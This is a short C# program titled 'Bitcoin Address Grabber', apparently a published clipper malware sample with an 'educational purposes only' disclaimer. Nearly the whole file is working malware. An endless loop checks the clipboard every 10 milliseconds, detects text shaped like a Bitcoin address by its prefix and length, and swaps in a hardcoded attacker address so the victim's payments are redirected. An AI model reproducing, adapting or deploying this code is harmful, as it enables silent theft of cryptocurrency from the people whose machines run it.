using System;
using System.Windows.Forms;
using System.Threading;

//       │ Author     : NYAN CAT
//       │ Name       : Bitcoin Address Grabber
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.

namespace Bitcoin_Grabber
{
    class Program
    {
        [Obsolete]
        [STAThread]
        static void Main()
        {
            // the address always start with 1 or 3 or bc1
            // the length is between 26-35 characters
            // more info https://en.bitcoin.it/wiki/Address
            string bitcoinAddress = "1This is your bitcoin address";


            for (; ; )
            {
                Thread.Sleep(10);
                if (Clipboard.GetText() != bitcoinAddress)
                    if (Clipboard.GetText().Length >= 26 && Clipboard.GetText().Length <= 35)
                        if (Clipboard.GetText().StartsWith("1") ||
                            Clipboard.GetText().StartsWith("3") ||
                            Clipboard.GetText().StartsWith("bc1"))
                        {
                            new Thread(() =>
                            {
                                Clipboard.SetText(bitcoinAddress);
                            })
                            { ApartmentState = ApartmentState.STA }.Start();
                        }
            }


        }
    }
}